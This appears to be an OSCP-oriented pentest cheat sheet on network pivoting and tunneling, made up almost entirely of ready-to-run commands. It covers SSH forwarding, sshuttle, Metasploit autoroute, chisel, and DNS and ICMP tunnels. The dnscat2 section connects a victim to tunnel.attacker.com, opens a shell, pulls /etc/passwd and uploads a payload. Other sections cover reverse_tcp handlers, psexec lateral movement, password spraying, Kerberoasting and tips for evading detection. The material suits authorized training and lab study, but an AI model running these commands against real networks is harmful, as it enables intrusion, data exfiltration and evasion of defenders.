# Advanced Network Pivoting & Tunneling

Complete guide for network pivoting, tunneling, and multi-hop access in complex enterprise environments.

---

## Table of Contents
1. [SSH-Based Pivoting](#1-ssh-based-pivoting)
2. [sshuttle (VPN over SSH)](#2-sshuttle-vpn-over-ssh)
3. [Metasploit Pivoting](#3-metasploit-pivoting)
4. [Proxychains & SOCKS](#4-proxychains--socks)
5. [DNS Tunneling](#5-dns-tunneling)
6. [ICMP Tunneling](#6-icmp-tunneling)
7. [Port Forwarding Advanced](#7-port-forwarding-advanced)
8. [Double & Triple Pivoting](#8-double--triple-pivoting)
9. [OSCP Practical Examples](#9-oscp-practical-examples)

---

## 1. SSH-Based Pivoting

### 1.1 Local Port Forward

**Forward local port to remote service:**
```bash
# Access internal service through compromised host
ssh -L 8080:internal-server:80 user@pivot-host

# Now access on localhost
curl http://127.0.0.1:8080
```

**Multiple Forwards:**
```bash
ssh -L 8080:10.10.10.10:80 \
    -L 3389:10.10.10.20:3389 \
    -L 445:10.10.10.30:445 \
    user@pivot-host
```

---

### 1.2 Remote Port Forward

**Expose local service to remote network:**
```bash
# On attacker machine
ssh -R 8080:localhost:80 user@pivot-host

# pivot-host can now access attacker's port 80 via localhost:8080
```

**Use Case:**
- Exfiltrate data to attacker-controlled server
- Serve payloads from attacker machine

---

### 1.3 Dynamic Port Forward (SOCKS Proxy)

**Create SOCKS proxy:**
```bash
# Establish SOCKS proxy on port 1080
ssh -D 1080 user@pivot-host

# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

# Use with any tool
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

---

### 1.4 Jump Host (ProxyJump)

**Multi-hop SSH:**
```bash
# Direct connection through jump host
ssh -J user1@pivot1 user2@target

# Multiple jumps
ssh -J user1@pivot1,user2@pivot2 user3@target

# SSH config (~/.ssh/config)
Host target
    HostName 10.10.10.100
    User admin
    ProxyJump pivot1,pivot2
```

---

## 2. sshuttle (VPN over SSH)

### 2.1 Basic Usage

**Create VPN tunnel:**
```bash
# Route entire subnet through SSH
sshuttle -r user@pivot-host 10.10.10.0/24

# Now directly access any host in 10.10.10.0/24
nmap -sS 10.10.10.50
crackmapexec smb 10.10.10.0/24
```

**Advantages:**
- No SOCKS proxy needed
- Transparent routing
- Works with any application

---

### 2.2 Advanced Options

**Multiple Subnets:**
```bash
sshuttle -r user@pivot-host 10.10.10.0/24 192.168.1.0/24
```

**DNS Tunneling:**
```bash
# Tunnel DNS queries through SSH
sshuttle -r user@pivot-host 10.10.10.0/24 --dns
```

**Exclude Ranges:**
```bash
# Exclude specific hosts/subnets
sshuttle -r user@pivot-host 10.10.10.0/24 -x 10.10.10.50
```

**Auto-hosts:**
```bash
# Automatically add hosts to /etc/hosts
sshuttle -r user@pivot-host 10.10.10.0/24 --auto-hosts
```

---

### 2.3 SSH Key Authentication

**Use SSH key:**
```bash
sshuttle -r user@pivot-host 10.10.10.0/24 -e "ssh -i /path/to/key"
```

**Background Mode:**
```bash
# Run in background (daemon)
sshuttle -r user@pivot-host 10.10.10.0/24 -D
```

---

## 3. Metasploit Pivoting

### 3.1 Autoroute

**Add route through Meterpreter session:**
```bash
meterpreter > run autoroute -s 10.10.10.0/24

# Or manually
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 10.10.10.0
msf6 post(multi/manage/autoroute) > run
```

**View Routes:**
```bash
meterpreter > run autoroute -p

# Or
msf6 > route print
```

**Use Routed Access:**
```bash
# Now use any module against internal network
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(smb_version) > run
```

---

### 3.2 Portfwd (Meterpreter)

**Port Forward:**
```bash
# Forward remote port to local
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.50

# Access via localhost
rdesktop 127.0.0.1:3389
```

**List Forwards:**
```bash
meterpreter > portfwd list
```

**Delete Forward:**
```bash
meterpreter > portfwd delete -l 3389
```

---

### 3.3 SOCKS Proxy (Metasploit)

**Start SOCKS Server:**
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 4a
msf6 auxiliary(socks_proxy) > run -j

# Add route
msf6 > route add 10.10.10.0/24 1
```

**Use with Proxychains:**
```bash
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p password
```

---

## 4. Proxychains & SOCKS

### 4.1 Configuration

**Edit /etc/proxychains4.conf:**
```bash
# Dynamic chain (tries all proxies in order)
dynamic_chain

# Proxy DNS
proxy_dns

# Proxies
[ProxyList]
socks4 127.0.0.1 1080
socks5 127.0.0.1 1081
```

---

### 4.2 Usage Examples

**Basic Usage:**
```bash
# Syntax
proxychains <command>

# Examples
proxychains nmap -sT -Pn 10.10.10.50
proxychains crackmapexec smb 10.10.10.0/24
proxychains curl http://10.10.10.50
```

**Disable Noise:**
```bash
# Quiet mode
proxychains -q nmap -sT 10.10.10.50
```

---

### 4.3 Chain Multiple Proxies

**Config:**
```
dynamic_chain

[ProxyList]
socks4 127.0.0.1 1080   # First pivot
socks4 127.0.0.1 1081   # Second pivot
socks4 127.0.0.1 1082   # Third pivot
```

**Traffic Flow:**
```
Attacker → Pivot1 → Pivot2 → Pivot3 → Target
```

---

## 5. DNS Tunneling

### 5.1 dnscat2

**Server (Attacker):**
```bash
# Start dnscat2 server
ruby dnscat2.rb tunnel.attacker.com

# Note the secret key
```

**Client (Target):**
```bash
# Windows
dnscat2.exe tunnel.attacker.com --secret=<key>

# Linux
./dnscat tunnel.attacker.com --secret=<key>
```

**Server Commands:**
```
dnscat2> sessions
dnscat2> session -i 1
command (victim) 1> shell
command (victim) 1> download /etc/passwd
command (victim) 1> upload payload.exe
```

---

### 5.2 iodine

**Server (Attacker):**
```bash
# Setup
apt install iodine

# Start server (requires domain pointing to your IP)
iodined -f -c -P secretpass 10.0.0.1 tunnel.attacker.com
```

**Client (Target):**
```bash
# Connect
iodine -f -P secretpass tunnel.attacker.com

# Assigned IP: 10.0.0.2
# Server IP: 10.0.0.1

# Now SSH over DNS tunnel
ssh user@10.0.0.1
```

**Performance:**
- Very slow (DNS tunneling overhead)
- Good for bypassing firewalls
- Useful when HTTP/HTTPS blocked

---

### 5.3 Detection & Evasion

**Blue Team Detects:**
- High volume of DNS queries
- Long DNS query names
- Unusual TXT/NULL records

**Red Team Evades:**
- Slow down queries (jitter)
- Use legitimate-looking domains
- Mix with normal DNS traffic

---

## 6. ICMP Tunneling

### 6.1 ptunnel-ng

**Server (Attacker):**
```bash
# Install
apt install ptunnel-ng

# Start server
ptunnel-ng -p secretpass
```

**Client (Target):**
```bash
# Tunnel SSH over ICMP
ptunnel-ng -p secretpass -lp 8000 -da 10.10.10.100 -dp 22 -r attacker-ip

# Connect via localhost
ssh user@localhost -p 8000
```

**Traffic Flow:**
```
SSH → localhost:8000 → ICMP tunnel → Attacker → 10.10.10.100:22
```

---

### 6.2 Use Cases

**Bypass Firewall:**
- ICMP often allowed outbound
- Useful when TCP/UDP blocked
- Slower than DNS tunneling

**Detection:**
- Unusual ICMP packet sizes
- High ICMP traffic volume
- ICMP to non-gateway IPs

---

## 7. Port Forwarding Advanced

### 7.1 Netsh (Windows)

**Port Forward:**
```cmd
# Requires Admin
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50

# View
netsh interface portproxy show all

# Delete
netsh interface portproxy delete v4tov4 listenport=8080
```

**Use Case:**
- Forward port on compromised Windows host
- No additional tools needed

---

### 7.2 Socat

**TCP Relay:**
```bash
# Forward port 8080 → 10.10.10.50:80
socat TCP-LISTEN:8080,fork TCP:10.10.10.50:80
```

**Encrypted Tunnel:**
```bash
# Server
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:10.10.10.50:80

# Client
socat TCP-LISTEN:8080,fork OPENSSL:server-ip:443,verify=0
```

---

### 7.3 Chisel

**Server (Attacker):**
```bash
# Reverse proxy mode
./chisel server -p 8000 --reverse
```

**Client (Target):**
```bash
# SOCKS proxy
./chisel client 10.10.10.200:8000 R:socks

# Port forward
./chisel client 10.10.10.200:8000 R:3389:10.10.10.50:3389
```

**Proxychains Usage:**
```bash
# Configure proxychains for port 1080
proxychains nmap -sT 10.10.10.0/24
```

---

## 8. Double & Triple Pivoting

### 8.1 Scenario: Double Pivot

**Network:**
```
Attacker → Pivot1 (DMZ) → Pivot2 (Internal) → Target (Secure Zone)
10.10.10.200   192.168.1.100    10.20.30.50      172.16.0.10
```

**Setup:**

**Step 1: SSH to Pivot1**
```bash
ssh -D 1080 user@192.168.1.100
```

**Step 2: SSH through Pivot1 to Pivot2**
```bash
proxychains ssh -D 1081 user@10.20.30.50
```

**Step 3: Access Target**
```bash
# Edit /etc/proxychains.conf
[ProxyList]
socks4 127.0.0.1 1081

# Access target
proxychains nmap -sT 172.16.0.10
```

---

### 8.2 sshuttle Double Pivot

**Pivot1 to Pivot2:**
```bash
# First tunnel
sshuttle -r user@pivot1 10.20.30.0/24

# Second tunnel (through first)
sshuttle -r user@10.20.30.50 172.16.0.0/24
```

**Now:**
```bash
# Direct access to secure zone
nmap -sS 172.16.0.10
```

---

### 8.3 Metasploit Triple Pivot

**Setup:**
```bash
# Session 1: Pivot1 (DMZ)
meterpreter > run autoroute -s 10.20.30.0/24

# Exploit Pivot2
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.100  # Pivot1 IP
msf6 > exploit

# Session 2: Pivot2 (Internal)
meterpreter > run autoroute -s 172.16.0.0/24

# Session 3: Target (Secure Zone)
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 172.16.0.10
msf6 > exploit
```

**Route Table:**
```
10.20.30.0/24 → Session 1
172.16.0.0/24 → Session 2
```

---

### 8.4 Chisel Multi-Hop

**Pivot1 (DMZ):**
```bash
./chisel server -p 8000 --reverse
```

**Pivot2 (Internal):**
```bash
# Connect to Pivot1
./chisel client pivot1-ip:8000 R:8001:0.0.0.0:8001

# Start server on 8001
./chisel server -p 8001 --reverse
```

**Target (Secure Zone):**
```bash
# Connect through Pivot2
./chisel client 127.0.0.1:8001 R:socks
```

**Attacker:**
```bash
# Access via SOCKS on Pivot1:1080
proxychains nmap -sT 172.16.0.10
```

---

## 9. OSCP Practical Examples

### 9.1 Quick Pivot Checklist

**1. Discover Internal Networks:**
```bash
# On compromised host
ip addr show
ifconfig
route -n
arp -a
```

**2. Establish Pivot:**
```bash
# Option A: SSH (Linux)
ssh -D 1080 user@pivot-host

# Option B: Chisel (Windows/Linux)
./chisel server -p 8000 --reverse  # Attacker
.\chisel.exe client 10.10.10.200:8000 R:socks  # Target

# Option C: Metasploit
meterpreter > run autoroute -s 10.10.10.0/24
```

**3. Scan Internal Network:**
```bash
proxychains nmap -sT -Pn 10.10.10.0/24
```

---

### 9.2 Common OSCP Scenario

**Given:**
- Compromised DMZ host: 192.168.1.100
- Internal network: 10.10.10.0/24
- Target DC: 10.10.10.10

**Solution:**
```bash
# 1. SSH SOCKS proxy
ssh -D 1080 user@192.168.1.100

# 2. Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf

# 3. Enumerate DC
proxychains crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt

# 4. Kerberoast (if creds found)
proxychains impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# 5. PSExec
proxychains impacket-psexec domain.local/admin@10.10.10.10
```

---

### 9.3 Port Forward Quick Reference

**SSH Local Forward:**
```bash
ssh -L 8080:internal-host:80 user@pivot
curl http://127.0.0.1:8080
```

**SSH Remote Forward:**
```bash
ssh -R 8080:localhost:80 user@pivot
```

**SSH Dynamic (SOCKS):**
```bash
ssh -D 1080 user@pivot
proxychains nmap -sT internal-host
```

**Chisel:**
```bash
# Attacker
./chisel server -p 8000 --reverse

# Target
.\chisel.exe client 10.10.10.200:8000 R:socks
```

**sshuttle:**
```bash
sshuttle -r user@pivot 10.10.10.0/24
nmap -sS 10.10.10.50  # Direct access
```

---

## 10. Troubleshooting

### 10.1 Common Issues

**SOCKS proxy not working:**
```bash
# Test connectivity
curl --socks4 127.0.0.1:1080 http://10.10.10.50

# Check if proxy is running
netstat -tulnp | grep 1080
```

**Proxychains hanging:**
```bash
# Use TCP connect scan (not SYN)
proxychains nmap -sT -Pn target

# Reduce timeout
proxychains -q nmap -sT --host-timeout 30s target
```

**DNS not resolving:**
```bash
# Add to /etc/hosts
echo "10.10.10.50 target.local" >> /etc/hosts

# Or use IP directly
proxychains nmap -sT 10.10.10.50
```

---

### 10.2 Performance Optimization

**Reduce Latency:**
```bash
# Disable DNS in proxychains.conf
#proxy_dns

# Use faster chain
strict_chain  # Instead of dynamic_chain
```

**Increase Stability:**
```bash
# SSH keep-alive
ssh -D 1080 -o ServerAliveInterval=60 user@pivot
```

---

## 11. Tools Summary

| Tool | Type | OSCP Relevant | Use Case |
|------|------|---------------|----------|
| **SSH** | Built-in | ✅ Yes | Port forwarding, SOCKS |
| **sshuttle** | VPN | ✅ Yes | Transparent routing |
| **Chisel** | Tunnel | ✅ Yes | Windows pivoting |
| **Metasploit** | Framework | ✅ Yes (limited) | Autoroute, portfwd |
| **Proxychains** | Proxy | ✅ Yes | Chain SOCKS proxies |
| **dnscat2** | DNS tunnel | ⚠️ Advanced | Firewall bypass |
| **ptunnel-ng** | ICMP tunnel | ⚠️ Advanced | ICMP over firewall |

---

## 12. References
- SSH Tunneling: https://www.ssh.com/academy/ssh/tunneling
- sshuttle: https://github.com/sshuttle/sshuttle
- Chisel: https://github.com/jpillora/chisel
- MITRE ATT&CK: Proxy (T1090)

---

**OSCP Note:** Focus on SSH, sshuttle, and Chisel for exam. Metasploit pivoting is powerful but limited by exam rules. Practice double pivoting scenarios in labs!
